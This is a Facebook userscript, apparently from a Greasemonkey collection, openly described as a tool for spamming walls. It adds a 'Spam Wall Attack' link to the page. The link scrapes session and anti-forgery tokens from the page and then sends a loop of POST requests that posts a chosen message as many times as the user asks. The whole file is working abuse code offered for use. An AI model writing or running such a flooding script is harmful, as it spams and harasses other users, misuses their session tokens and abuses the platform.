// ==UserScript==
// @name           Spam muro
// @namespace      spamwall
// @description    Utiliza este script para hacer spam
// @include        https://www.facebook.com/*
// @include        http://www.facebook.com/*
// @version        3.0
// @author         http://www.facebook.com/Alonso.Beltran02
// @homepage       http://www.facebook.com/Alonso.Beltran02
// ==/UserScript==

body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+97px";
	div.style.left = "+8px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "2px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"JavaScript:FloodWal()\">Spam Wall Attack</a>"
	
	body.appendChild(div);
	
	function FloodWal() {
	
		var a = document.body.innerHTML;var Num=prompt("","Enter how many message(s) to be sent");var msg=prompt("","Enter the Text Message(s)");formx=a.match(/name="post_form_id" value="([\d\w]+)"/)[1];dts=a.match(/name="fb_dtsg" value="([^"]+)"/)[1];composerid=a.match(/name="xhpc_composerid" value="([^"]+)"/)[1];target=a.match(/name="targetid" value="([^"]+)"/)[1];pst="post_form_id="+formx+"&fb_dtsg="+dts+"&xhpc_composerid="+composerid+"&xhpc_targetid="+target+ "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text="+encodeURIComponent(msg)+"&xhpc_message="+encodeURIComponent(msg)+"&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest";i=0;while(i < Num){with(newx = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),send(pst);i += 1;void(0);
		}

	}
}